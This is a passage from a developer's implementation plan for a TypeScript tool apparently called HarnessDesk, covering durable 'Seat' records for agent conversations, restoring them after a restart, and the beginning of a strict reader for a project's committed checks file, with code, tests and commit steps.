  /* What the seating asked the evidence plane to keep, durable, for each seat it kept. */
  const durable: SeatOpeningInput[] = []
```

   - As the first entry of the `ctx` object literal, before `agents: {`, add:

```ts
    evidence: {
      seats: {
        opened: async (input: SeatOpeningInput) => {
          durable.push(input)
          return {}
        },
      },
    },
```

   - In the object `rig` returns, add `durable,` after `recorded,`.

- [ ] **Step 4: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/seats.js'`.

- [ ] **Step 5: The Seat book**

Create `packages/server/src/evidence/seats.ts`:

```ts
import { sessionKey, type SeatId, type SeatRecord } from '@harnessdesk/protocol'

import { foldSeats, mintId, type SeatOpening } from './records.js'
import { projectOf, revisionOf } from './revision.js'
import type { EvidenceStore } from './store.js'

/**
 * Every Seat this desk kept, durable, and each conversation's in the order it
 * was seated.
 *
 * The store is the truth and this is its index: read whole at start (`load`),
 * then kept current by the two writes a Seat ever gets — its opening, when the
 * seat is kept, and its closing, when the desk lets it go. Both are awaited, so
 * a Seat the desk answers with is a Seat already on disk.
 *
 * A Seat a backup brought (`restored`) is history. It is indexed and drawn,
 * but a Seat this desk kept always comes first for a conversation, and the
 * desk never closes a restored one: what it says about that conversation was
 * said somewhere else.
 */

/** What the desk knows when it keeps a seat. The checkout, the id and the time are read here. */
export type SeatOpeningInput = Omit<SeatOpening, 'id' | 'checkout' | 'openedAt'> & {
  /** The folder the conversation works in. */
  readonly cwd: string
}

export class SeatBook {
  readonly #store: EvidenceStore
  readonly #now: () => number
  readonly #byId = new Map<SeatId, SeatRecord>()
  readonly #bySession = new Map<string, SeatId[]>()
  /** The project each Seat's record is kept under, so its closing goes beside its opening. */
  readonly #projects = new Map<SeatId, string>()
  /** Openings still reading git before they write: a quit waits for them too (`settled`). */
  readonly #inFlight = new Set<Promise<unknown>>()

  constructor(store: EvidenceStore, now: () => number = Date.now) {
    this.#store = store
    this.#now = now
  }

  /** Reads every project's Seats, whole: at start, and again after a restore. */
  async load(): Promise<void> {
    this.#byId.clear()
    this.#bySession.clear()
    this.#projects.clear()
    for (const project of await this.#store.projects()) {
      const { lines } = await this.#store.read(project, 'seats')
      for (const seat of foldSeats(lines)) this.#index(seat, project)
    }
  }

  /** Writes a kept seat's record, and answers it once it is on disk. */
  opened(input: SeatOpeningInput): Promise<SeatRecord> {
    const writing = this.#open(input)
    this.#inFlight.add(writing)
    const done = (): void => {
      this.#inFlight.delete(writing)
    }
    writing.then(done, done)
    return writing
  }

  /** Resolves once every opening already asked for has been written, or has failed. */
  async settled(): Promise<void> {
    await Promise.allSettled([...this.#inFlight])
  }

  async #open(input: SeatOpeningInput): Promise<SeatRecord> {
    const { cwd, ...rest } = input
    const project = await projectOf(cwd)
    const revision = await revisionOf(cwd)
    const opening: SeatOpening = {
      ...rest,
      id: mintId(),
      checkout: { cwd, project, branch: revision?.branch ?? null, head: revision?.head ?? null },
      openedAt: this.#now(),
    }
    await this.#store.append(project, 'seats', [{ type: 'seat', record: opening }])
    const record: SeatRecord = { ...opening, closed: null }
    this.#index(record, project)
    return record
  }

  /** Closes every Seat this desk kept for a conversation that is still open, and answers what it closed. */
  async closed(runtime: string, sessionId: string, why: string): Promise<SeatRecord[]> {
    const open = this.of(runtime, sessionId).filter((seat) => seat.closed === null && !seat.restored)
    const at = this.#now()
    const out: SeatRecord[] = []
    for (const seat of open) {
      const project = this.#projects.get(seat.id) ?? seat.checkout.project
      await this.#store.append(project, 'seats', [{ type: 'seat-closed', closing: { seat: seat.id, at, why } }])
      const closed: SeatRecord = { ...seat, closed: { at, why } }
      this.#byId.set(seat.id, closed)
      out.push(closed)
    }
    return out
  }

  /** A conversation's Seats, oldest first. */
  of(runtime: string, sessionId: string): SeatRecord[] {
    return (this.#bySession.get(sessionKey(runtime, sessionId)) ?? [])
      .flatMap((id) => {
        const seat = this.#byId.get(id)
        return seat ? [seat] : []
      })
      .sort((a, b) => a.openedAt - b.openedAt)
  }

  /**
   * The Seat a conversation holds now: its latest one this desk kept — or,
   * when this desk kept none, the latest a backup brought, as history — or
   * null when it was never seated.
   */
  latestOf(runtime: string, sessionId: string): SeatRecord | null {
    const seats = this.of(runtime, sessionId)
    return seats.filter((seat) => !seat.restored).at(-1) ?? seats.at(-1) ?? null
  }

  /** The latest Seat this desk itself kept for a conversation, or null: only these say which Agent it is. */
  latestKeptOf(runtime: string, sessionId: string): SeatRecord | null {
    return this.of(runtime, sessionId).filter((seat) => !seat.restored).at(-1) ?? null
  }

  byId(id: SeatId): SeatRecord | null {
    return this.#byId.get(id) ?? null
  }

  #index(seat: SeatRecord, project: string): void {
    if (this.#byId.has(seat.id)) return
    this.#byId.set(seat.id, seat)
    this.#projects.set(seat.id, project)
    const key = sessionKey(seat.session.runtime, seat.session.sessionId)
    this.#bySession.set(key, [...(this.#bySession.get(key) ?? []), seat.id])
  }
}
```

- [ ] **Step 6: The plane the host holds**

Create `packages/server/src/evidence/plane.ts`:

```ts
import type { TeamState, WireNotification } from '@harnessdesk/protocol'

import { SeatBook } from './seats.js'
import { EvidenceStore } from './store.js'

/**
 * The evidence plane: the store, the Seats it indexes, and — as later tasks
 * add them — the checks it runs and the facts it observes.
 *
 * Held by the host for the reason the team plane is: the host owns every
 * conversation and every room, so it is the one place a fact can be observed
 * with the seat that produced it and the card it was for. Wire methods reach it
 * as `ctx.evidence`, never around it.
 */

/** What the plane may ask of the host. */
export interface EvidencePort {
  /** A room's board, or null when the desk has no such room. */
  board(room: string): TeamState | null
  /** The folder a conversation works in, when the desk holds it. */
  cwdOf(runtime: string, sessionId: string): string | null
  /** Tells every window. */
  push(notification: WireNotification): void
  log(message: string, details?: Readonly<Record<string, unknown>>): void
}

export interface EvidenceOptions {
  /** `evidence/` in the desk's state directory. */
  readonly dir: string
  readonly now?: () => number
}

export class EvidencePlane {
  readonly store: EvidenceStore
  readonly seats: SeatBook
  readonly #port: EvidencePort
  readonly #now: () => number

  constructor(options: EvidenceOptions, port: EvidencePort) {
    this.#port = port
    this.#now = options.now ?? Date.now
    this.store = new EvidenceStore(options.dir, (message, details) => port.log(message, details))
    this.seats = new SeatBook(this.store, options.now)
  }

  /** Reads what a previous launch recorded. Once, at start. */
  async load(): Promise<void> {
    await this.seats.load()
  }

  /** The desk is closing: this resolves once every record already asked for is on disk. */
  async close(): Promise<void> {
    await this.seats.settled()
    // A write that failed was refused to its caller already; the quit says so again, where it is read.
    await this.store.flush().catch((error: unknown) =>
      this.#port.log('some evidence records could not be written before the desk closed', {
        error: error instanceof Error ? error.message : String(error),
      }),
    )
  }
}
```

`#now` is read by the methods later tasks add; nothing reads it in this task.

- [ ] **Step 7: The host holds it; methods reach it**

1. In `packages/server/src/methods/context.ts`, add `import type { EvidencePlane } from '../evidence/plane.js'` after `import type { EditorPlane } from '../editor-plane.js'`, and in `interface HostContext`, after `readonly seating: MachineSeatingFile` and its comment, add:

```ts
  /**
   * The evidence plane: every Seat this desk kept, what it observed, and the
   * project checks it runs once a person has seen them. Its own store, never
   * the usage ledger (`ledger()`).
   */
  readonly evidence: EvidencePlane
```

2. In `packages/server/src/host.ts`:
   - Add `import { EvidencePlane } from './evidence/plane.js'` after `import { EditorPlane } from './editor-plane.js'`.
   - After the field `readonly #machineSeating: MachineSeatingFile` (and its comment), add:

```ts
  /**
   * The evidence plane: every Seat this desk kept and what it observed, one
   * append-only store per project under `evidence/` in the state directory.
   */
  readonly #evidence: EvidencePlane
```

   - Directly after the statement that assigns `this.#machineSeating` — `this.#machineSeating = new MachineSeatingFile(join(this.#state.directory, SEATING_FILE), { log: … })` — add:

```ts
    this.#evidence = new EvidencePlane(
      { dir: join(this.#state.directory, 'evidence') },
      {
        board: (room) => (this.#team.hasRoom(room) ? this.#team.stateFor(room) : null),
        cwdOf: (runtime, sessionId) =>
          this.registry.get(runtimeId(runtime), makeSessionId(sessionId))?.session.cwd ?? null,
        push: (notification) => this.#push(notification),
        log: (message, details) => this.#logger.warn(message, details ?? {}),
      },
    )
```

   - In `#buildContext()`, after `seating: this.#machineSeating,`, add `evidence: this.#evidence,`.
   - In `dispose()`, immediately before the last line `await this.#audit.flush()`, add `await this.#evidence.close()`.

3. Create `packages/server/src/methods/evidence.ts`:

```ts
import type { MethodsUnder } from './context.js'

/**
 * The evidence plane, read — and, from later in phase 4, asked to run a
 * project's named checks. Everything here reaches the plane as `ctx.evidence`.
 */
export const evidenceMethods = {
  'evidence/seat': (ctx, params) => ctx.evidence.seats.latestOf(params.runtime, params.sessionId),
} satisfies MethodsUnder<'evidence/'>
```

4. In `packages/server/src/methods/index.ts`, add `import { evidenceMethods } from './evidence.js'` after `import { credentialMethods } from './credentials.js'`; in `hostMethods` add `...evidenceMethods,` after `...agentMethods,`; and in `methodDomains` add `evidenceMethods,` after `agentMethods,`.

- [ ] **Step 8: The verb, on the wire**

1. In `packages/protocol/src/wire.ts`, add `import type { SeatRecord } from './evidence.js'` after `import type { EditorDocument, EditorEvent } from './editor.js'`, and in `interface HostMethods`, after the `'agent/reveal'` entry, add:

```ts

  /**
   * A conversation's Seat record: the latest Seat the desk kept it as, with how
   * it ended, or null when the desk never seated it. Read-only, as the record
   * is: it is written once, when the seat is kept, and closed once.
   */
  'evidence/seat': {
    params: { readonly runtime: string; readonly sessionId: string }
    result: SeatRecord | null
  }
```

2. In `packages/protocol/src/wire-validators.ts`, after the `'agent/reveal': shape({ … }),` entry, add:

```ts

  'evidence/seat': shape({ runtime: isFilled, sessionId: isFilled }),
```

3. In `script/check-reachable.mjs`, add to `UNREACHED`:

```js
  'evidence/seat': "a conversation's details draw its Seat record, in the second half of the evidence phase",
```

- [ ] **Step 9: `agent/seat` writes the record before the seat is kept**

In `packages/server/src/methods/agents.ts`, in `'agent/seat'`, between the `seated` literal Task 1 wrote and `return ctx.seats.recordAgent(opened.runtime, opened.sessionId, seated)`, add:

```ts
      /* Written before the seat is kept, and awaited. A seat whose record could
         not be written is closed, as one whose brief could not be handed over
         is: no conversation works as an Agent with no record that it did. */
      try {
        await ctx.evidence.seats.opened({
          agent: { id: definition.id, name: definition.name, origin: entry.origin },
          briefDigest: digest,
          seat,
          seatLabel: seated.seatLabel,
          passedOver: seated.passedOver,
          // Today's generation of standing order, as the Agent's file said it. Phase 3
          // writes `{ kind: 'ceiling', level }` here for an Agent that says only `ceiling:`.
          standing: { kind: 'permission', permission },
          ceiling: seated.ceiling,
          cwd: params.cwd,
          session: { runtime: opened.runtime, sessionId: opened.sessionId },
          board: null,
          role: null,
        })
      } catch (error) {
        await ctx.seats.retire(opened.runtime, opened.sessionId)
        throw new Error(
          `${definition.name} was seated on ${describeSeat(seat, words)}, and its Seat record could not be written, so the conversation was closed: ${messageOf(error)}`,
        )
      }
```

- [ ] **Step 10: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-seats.test.js packages/server/dist/test/agent-seat.test.js packages/server/dist/test/methods.test.js`
Expected: PASS — `evidence-seats.test.js` 6 tests; `agent-seat.test.js` and `methods.test.js` with no failures.

Run: `node script/check-reachable.mjs`
Expected: exit 0, one more method pinned than before this task.

- [ ] **Step 11: Prove the tests can fail**

1. Delete the `try { await ctx.evidence.seats.opened(…) } catch { … }` block from `'agent/seat'`: `through the host: an Agent seated leaves its Seat record before the call answers…` fails (`evidence/seat` answers null). Restore it.
2. In that `catch`, delete `await ctx.seats.retire(opened.runtime, opened.sessionId)`: `…a seat whose record cannot be written is closed…` fails on `its handle is let go`. Restore it.
3. In `SeatBook.latestOf`, return `seats.at(-1) ?? null`, or in `closed`, drop `&& !seat.restored`: `a Seat a backup brought is history: a kept Seat comes first, and the desk never closes a restored one` fails. Restore it.

- [ ] **Step 12: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/seats.ts packages/server/src/evidence/plane.ts packages/server/src/methods/evidence.ts packages/server/src/methods/index.ts packages/server/src/methods/context.ts packages/server/src/host.ts packages/server/src/methods/agents.ts packages/protocol/src/wire.ts packages/protocol/src/wire-validators.ts script/check-reachable.mjs packages/server/test/fixtures/evidence-desk.ts packages/server/test/evidence-seats.test.ts packages/server/test/agent-seat.test.ts
git commit -m "feat(evidence): every seat an Agent takes leaves its Seat record first

agent/seat writes the seat's durable record — the Agent, the brief it was
handed, the seat as read back, what it passed over, its standing order in
today's words, the ceiling slot, the checkout read from git, and the
conversation it points at —
before the seat is kept, and waits for it. A seat whose record cannot be
written is closed, and the refusal says so. The host holds one evidence plane,
methods reach it as ctx.evidence, and evidence/seat reads a conversation's
record. The agent-seat test rig gains a stand-in plane (durable).

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 5: A flow's seats, and a deleted conversation

Two more writes a Seat gets. A flow run keeps each seat in its own `FlowSeatRecord`, which is the seat's working state and goes with the run; once a run exists, each of its seats also leaves a durable Seat record, on the run's board and in its role, with no Agent. And deleting a conversation closes its Seat — the one close this phase writes — while its record stays: it outlives the conversation it points at, which is exactly when it is needed.

**Files:**
- Modify: `packages/server/src/flows.ts` (`FlowPort.recorded`, and its one call)
- Modify: `packages/server/src/evidence/seats.ts` (`flowSeatInput`)
- Modify: `packages/server/src/host.ts` (the flow port writes the record)
- Modify: `packages/server/src/methods/sessions.ts` (`session/delete` closes the Seat)
- Test: `packages/server/test/evidence-seats.test.ts` (two tests appended)

**Proof needs:** neither

**Interfaces:**
- Consumes: `SeatBook.opened`, `SeatBook.closed` (Task 4); `FlowSeatRecord` (`@harnessdesk/protocol`).
- Produces: `FlowPort.recorded?(room: string, seat: FlowSeatRecord): void`; `flowSeatInput(room: string, seat: FlowSeatRecord): SeatOpeningInput` — the second of the two places phase 3 fills `ceiling`.

- [ ] **Step 1: Write the failing tests**

In `packages/server/test/evidence-seats.test.ts`, add `type FlowRun,` and `type TeamState,` to the import from `@harnessdesk/protocol`, add `until` to the import from `./fixtures/evidence-desk.js`, and append:

```ts
const FLOW = `
name: Record check
roles:
  worker:
    kind: agent
    seat: fake
    permission: read
    outcomes: [done]
    order: Do the one thing.
seed:
  role: worker
  title: The one thing
`

test("through the host: a flow's seat leaves a Seat record on its board and in its role, with no Agent", async (t) => {
  const { host, repo } = await evidenceDesk(t)
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Seat room' })) as TeamState
  const run = (await host.call('flow/start', { room: room.id, source: FLOW })) as FlowRun
  await host.call('flow/stop', { run: run.id })
  const seat = run.seats[0]
  assert.ok(seat)
  const record = await until(
    () => host.call('evidence/seat', { runtime: seat.runtime, sessionId: seat.sessionId }),
    "the flow seat's record",
  )
  assert.equal(record.agent, null)
  assert.equal(record.briefDigest, null)
  assert.equal(record.board, room.id)
  assert.equal(record.role, 'worker')
  assert.equal(record.seatLabel, seat.seat)
  assert.deepEqual(record.seat, seat.spec)
  assert.deepEqual(record.standing, { kind: 'permission', permission: 'read' })
  assert.equal(record.ceiling, null)
  assert.equal(record.checkout.cwd, seat.cwd)
})

test('through the host: deleting a conversation closes its Seat, and the record stays', async (t) => {
  const { host, stateDir, repo } = await evidenceDesk(t)
  await writeAgent(stateDir)
  const session = (await host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  await host.call('session/delete', { runtime: runtimeId('fake'), sessionId: session.id })
  const record = (await host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.equal(record.closed?.why, 'deleted')
  assert.equal(record.agent?.id, 'scout', 'the record outlives the conversation it points at')
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-seats.test.js`
Expected: FAIL — `through the host: a flow's seat…`: `waited 5000ms for the flow seat's record`; and `…deleting a conversation closes its Seat…`: `expected undefined to equal 'deleted'`.

- [ ] **Step 3: A flow's seat, recorded once its run exists**

1. In `packages/server/src/flows.ts`, in `interface FlowPort`, after `retire(runtime: string, sessionId: string): Promise<void>`, add:

```ts
  /**
   * A seat this run kept, once the run exists: the desk writes its durable
   * Seat record. The run's own `FlowSeatRecord` is the seat's working state
   * and goes with the run; the Seat record is what outlives it. Absent on a
   * port that keeps no records, which is every test port.
   */
  recorded?(room: string, seat: FlowSeatRecord): void
```

   and in `start`, directly after `this.#runs.set(id, run)`, add:

```ts
    for (const seat of seats) this.#port.recorded?.(request.room, seat)
```

2. In `packages/server/src/evidence/seats.ts`, change the protocol import to `import { sessionKey, type FlowSeatRecord, type SeatId, type SeatRecord } from '@harnessdesk/protocol'`, and add above `export class SeatBook`:

```ts
/**
 * What a flow's seat records: a runtime on a seat in a role on a board, and no
 * Agent — a flow seats runtimes until phase 6 gives its roles Agents. Its
 * standing order is the role's `permission:`; `ceiling` is the one value
 * phase 3 changes here.
 */
export const flowSeatInput = (room: string, seat: FlowSeatRecord): SeatOpeningInput => ({
  agent: null,
  briefDigest: null,
  seat: seat.spec,
  seatLabel: seat.seat,
  passedOver: [],
  standing: { kind: 'permission', permission: seat.permission },
  ceiling: null,
  cwd: seat.cwd,
  session: { runtime: seat.runtime, sessionId: seat.sessionId },
  board: room,
  role: seat.role,
})
```

3. In `packages/server/src/host.ts`, add `import { flowSeatInput } from './evidence/seats.js'` after the `EvidencePlane` import, and in the port the host builds for `new Flows(…)`, after `retire: (runtime, sessionId) => this.#retireSeat(runtime, sessionId),`, add:

```ts
      /* Not awaited by the run, which already exists: a record that could not
         be written is logged loudly with the seat it was for, and the run goes
         on. An Agent's seat is stricter (`agent/seat`), because nothing has
         started yet when its record is written. */
      recorded: (room, seat) => {
        void this.#evidence.seats.opened(flowSeatInput(room, seat)).catch((error: unknown) => {
          this.#logger.error("a flow seat's record could not be written", {
            room,
            role: seat.role,
            runtime: seat.runtime,
            sessionId: seat.sessionId,
            error: error instanceof Error ? error.message : String(error),
          })
        })
      },
```

- [ ] **Step 4: A deleted conversation's Seat is closed**

In `packages/server/src/methods/sessions.ts`, in `'session/delete'`, directly after the `if (record) { await record.live?.close().catch(() => {}); ctx.registry.delete(runtime.info.id, id) }` block, add:

```ts
    /* Its Seat, if it had one, is closed — never removed: the record outlives
       the conversation it points at, which is exactly when it is needed. */
    await ctx.evidence.seats.closed(runtime.info.id, id, 'deleted')
```

- [ ] **Step 5: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-seats.test.js packages/server/dist/test/flows.test.js packages/server/dist/test/host-flow.test.js`
Expected: PASS — `evidence-seats.test.js` 6 tests; `flows.test.js` and `host-flow.test.js` with no failures (their ports have no `recorded`).

- [ ] **Step 6: Prove the tests can fail**

1. Delete `for (const seat of seats) this.#port.recorded?.(request.room, seat)` from `flows.ts`: the flow test times out waiting for the record. Restore it.
2. Delete the `closed(…, 'deleted')` line from `'session/delete'`: the delete test fails on `closed?.why`. Restore it.

- [ ] **Step 7: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/flows.ts packages/server/src/evidence/seats.ts packages/server/src/host.ts packages/server/src/methods/sessions.ts packages/server/test/evidence-seats.test.ts
git commit -m "feat(evidence): a flow's seats leave Seat records, and a deleted conversation's Seat is closed

Once a flow run exists each of its seats leaves a durable Seat record on the
run's board and in its role, with no Agent — the run's own seat list is its
working state and goes with it. Deleting a conversation closes its Seat with
a second record; the first stays, since it outlives what it points at.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 6: A restarted desk knows its Seats

This is the half of the phase's *done* a restart proves: a closed conversation's Seat record is still there after a restart, and a conversation seated as an Agent still wears that Agent. The Seat book is read whole at start, before any runtime lists a conversation, and the registry learns, for a conversation it sees for the first time, which Agent its latest Seat record names — so the in-memory copy phases 1–3 kept is rebuilt from the durable one instead of being lost with the process.

**Files:**
- Modify: `packages/server/src/registry.ts` (`restoreSeatedAs`, and `upsert` uses it)
- Modify: `packages/server/src/evidence/plane.ts` (`seatedAs`)
- Modify: `packages/server/src/host.ts` (the registry is given the plane; the plane loads at start)
- Test: `packages/server/test/evidence-restart.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `SeatBook.load`, `SeatBook.latestKeptOf` (Task 4); `SeatedAs` (Task 1).
- Produces: `SessionRegistry.restoreSeatedAs(restore: (runtime: RuntimeId, id: SessionId) => SeatedAs | null): void`; `EvidencePlane.seatedAs(runtime: string, sessionId: string): SeatedAs | null`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-restart.test.ts`:

```ts
import assert from 'node:assert/strict'
import { test } from 'node:test'

import { runtimeId, type SeatRecord, type Session } from '@harnessdesk/protocol'

import { evidenceDesk, writeAgent } from './fixtures/evidence-desk.js'

/*
 * The half of phase 4's "done" a restart proves: a closed conversation's Seat
 * record is still there after a restart, and the conversation still wears the
 * Agent it was seated as — the in-memory copy phases 1–3 kept is gone with the
 * process, and the durable one takes its place.
 */

test('after a restart, a closed conversation still has its Seat record, and still wears its Agent', async (t) => {
  const first = await evidenceDesk(t)
  await writeAgent(first.stateDir)
  const session = (await first.host.call('agent/seat', { id: 'scout', cwd: first.repo.dir })) as Session
  const before = (await first.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  // Closing a pane is window management: the Seat is not closed by it.
  await first.host.call('session/close', { runtime: runtimeId('fake'), sessionId: session.id })
  await first.stop()

  const second = await evidenceDesk(t, {}, { stateDir: first.stateDir, repo: first.repo })
  const after = (await second.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.deepEqual(after, before, 'the record, whole, as it was written')

  const reopened = (await second.host.call('session/resume', { runtime: runtimeId('fake'), sessionId: session.id })) as Session
  assert.equal(reopened.settings?.agent, 'scout')
  assert.equal(reopened.settings?.briefDigest, before.briefDigest)
  assert.equal(reopened.settings?.permission, 'read')
  assert.equal(reopened.settings?.seatLabel, before.seatLabel)
})

test('a deleted conversation’s Seat record is still there after a restart, and says how it closed', async (t) => {
  const first = await evidenceDesk(t)
  await writeAgent(first.stateDir)
  const session = (await first.host.call('agent/seat', { id: 'scout', cwd: first.repo.dir })) as Session
  await first.host.call('session/delete', { runtime: runtimeId('fake'), sessionId: session.id })
  const before = (await first.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.equal(before.closed?.why, 'deleted')
  await first.stop()

  const second = await evidenceDesk(t, {}, { stateDir: first.stateDir, repo: first.repo })
  assert.deepEqual(await second.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) }), before)
})

test('a conversation never seated is restored as a plain one', async (t) => {
  const { host } = await evidenceDesk(t)
  await host.call('session/resume', { runtime: runtimeId('fake'), sessionId: 'never-seated' as never })
  const held = host.registry.get(runtimeId('fake'), 'never-seated' as never)
  assert.equal(held?.seatedAs, null)
  assert.equal(held?.session.settings?.agent, undefined)
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-restart.test.js`
Expected: FAIL — `after a restart, a closed conversation…`: `after` is `null` (nothing was read at start), where `before` is the record.

- [ ] **Step 3: The registry restores from the record**

In `packages/server/src/registry.ts`, in `class SessionRegistry`, after `readonly #records = new Map<SessionKey, SessionRecord>()`, add:

```ts
  /**
   * Where a conversation seen for the first time learns which Agent it was
   * seated as, from the desk's durable Seat records — so a restarted desk shows
   * a seated conversation as its Agent, not as a plain one. Null until the host
   * gives one (`restoreSeatedAs`); a registry with none restores nothing.
   */
  #restore: ((runtime: RuntimeId, id: SessionId) => SeatedAs | null) | null = null

  /** Gives the registry the durable record to restore a conversation's Agent from. Once, by the host. */
  restoreSeatedAs(restore: (runtime: RuntimeId, id: SessionId) => SeatedAs | null): void {
    this.#restore = restore
  }
```

and in `upsert`, where a new record is made, replace:

```ts
      tasks: [],
      seatedAs: null,
    }
    record.session = seatedSession(this.#settle(record, session), null)
```

with:

```ts
      tasks: [],
      seatedAs: this.#restore?.(session.runtime, session.id) ?? null,
    }
    record.session = seatedSession(this.#settle(record, session), record.seatedAs)
```

- [ ] **Step 4: The plane answers it, and loads before anything is listed**

1. In `packages/server/src/evidence/plane.ts`, add `import type { SeatedAs } from '../registry.js'` after the protocol import, and add above `close()`:

```ts
  /**
   * The Agent a conversation was seated as, from the latest Seat this desk
   * kept for it, in the shape the registry keeps it — or null when that Seat
   * was no Agent's (a flow's runtime seat), or this desk never seated it.
   * Closed or not: a conversation seated as an Agent is that Agent's for as
   * long as it lasts. A Seat a backup brought never answers this: it is history,
   * and it does not say what a conversation on this desk is.
   *
   * `SeatedAs` speaks today's generation of standing order; a Seat whose order
   * was a `ceiling:` is restored by phase 3, which adds that arm here when it
   * adds Agents that say only `ceiling:`.
   */
  seatedAs(runtime: string, sessionId: string): SeatedAs | null {
    const seat = this.seats.latestKeptOf(runtime, sessionId)
    if (!seat?.agent || seat.briefDigest === null || seat.standing.kind !== 'permission') return null
    return {
      agent: seat.agent.id,
      name: seat.agent.name,
      briefDigest: seat.briefDigest,
      permission: seat.standing.permission,
      seatLabel: seat.seatLabel,
      passedOver: seat.passedOver,
      ceiling: seat.ceiling,
    }
  }

```

2. In `packages/server/src/host.ts`:
   - Directly after the `this.#evidence = new EvidencePlane(…)` statement Task 4 added, add:

```ts
    // A conversation seen for the first time wears the Agent its Seat record names.
    this.registry.restoreSeatedAs((runtime, id) => this.#evidence.seatedAs(runtime, id))
```

   - In `start()`, directly after the `await this.#names.load()` that follows the comment ending `…settle only on the next refresh.`, add:

```ts
    /* Before any runtime starts, so the first conversation listed already
       wears the Agent its Seat record names. Caught like the flow runs above:
       records that cannot be read cost the restored names, not the desk. */
    await this.#evidence.load().catch((error: unknown) => {
      this.#logger.error('the Seat records this desk keeps could not be read', {
        error: error instanceof Error ? error.message : String(error),
      })
    })
```

   (`start()` is the one with `await this.#names.load()` after that comment; `#applyArchive` has another, which is not this one.)

- [ ] **Step 5: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-restart.test.js packages/server/dist/test/registry.test.js packages/server/dist/test/room-restart.test.js`
Expected: PASS — `evidence-restart.test.js` 3 tests; the other two with no failures.

- [ ] **Step 6: Prove the tests can fail**

1. Delete the `this.registry.restoreSeatedAs(…)` line from `host.ts`: `after a restart…` fails on `reopened.settings?.agent`, `undefined`. Restore it.
2. Delete the `await this.#evidence.load()…` block from `start()`: the same test fails earlier, on `after`. Restore it.

- [ ] **Step 7: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/registry.ts packages/server/src/evidence/plane.ts packages/server/src/host.ts packages/server/test/evidence-restart.test.ts
git commit -m "feat(evidence): a restarted desk reads its Seats back, and a seated conversation keeps its Agent

The Seat records are read at start, before any runtime lists a conversation,
and a conversation seen for the first time wears the Agent its latest record
names — its brief, its permission, the seat it took and what it passed over.
Only a Seat this desk kept says which Agent a conversation is; one a backup
brought never does. A Seat whose order was phase 3's ceiling: is restored by
phase 3, which adds that arm when it adds such Agents.
The in-memory copy is rebuilt from the durable record instead of being lost
with the process, and a closed conversation's record is there after a
restart.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 7: `.harnessdesk/checks.yml` — a project's named checks

> **Security-critical.** `.harnessdesk/checks.yml` is committed in a repository someone may have cloned; every command in it is untrusted input. This task runs nothing — it reads the file as strictly as a person reading it needs, so that what Task 11 later shows them is byte for byte what would run. Its tests pin that anything which could make those two differ is refused where it is read.

The spec's form is `verify: { run: pnpm verify, timeout: 1200 }`. A check says `run` and optionally `timeout`, nothing else. A file that will not parse is listed with where and why, never read as "no checks", and a list longer than the limit is refused whole, never cut short.

**Read as committed, from one snapshot.** The file is read from git, not from the disk: the commit at the main checkout's `HEAD`, then the blob `.harnessdesk/checks.yml` names in it — two immutable objects, so nothing in the repository can swap the file, or `.harnessdesk`, between a check and a read the way it could between an `lstat`, a `realpath` and a `readFile`. The blob's id is the file's generation (`digest`): what a person is shown, what they approve (Task 8) and what runs (Task 11) are all bound to exactly those bytes. A file, or a `.harnessdesk`, committed as a link is refused. A file that exists but is not committed offers no check until it is, and says so. A working copy that differs from what is committed is said (`uncommitted`) and never read for its checks: it is opened without following a link and without waiting on a pipe, only to compare. Every git call is `execFile` with optional locks off, and none of them runs a hook or a filter.

**Files:**
- Create: `packages/server/src/evidence/checks-file.ts`
- Modify: `packages/protocol/src/evidence.ts` (`NamedCheck`)
- Test: `packages/server/test/evidence-checks-file.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `parseYaml` (`packages/server/src/yaml.ts`); `makeRepo` (Task 3's fixture).
- Produces: in `@harnessdesk/protocol`, `interface NamedCheck { name: string; run: string; timeout: number }`. From `checks-file.ts`: `CHECKS_FILE`, `CHECKS_FILE_LIMIT = 65536`, `CHECK_LIMIT = 32`, `COMMAND_LIMIT = 2000`, `TIMEOUT_DEFAULT = 600`, `TIMEOUT_MAX = 14400`; `interface ChecksProblem { at: string; text: string; check?: string }`; `interface ChecksFile { file: string; exists: boolean; digest: string | null; at: string | null; uncommitted: boolean; checks: readonly NamedCheck[]; problems: readonly ChecksProblem[] }` — `digest` the committed blob's id, `at` the commit it was read at; `readChecks(project: string): Promise<ChecksFile>`.

- [ ] **Step 1: Write the failing tests**

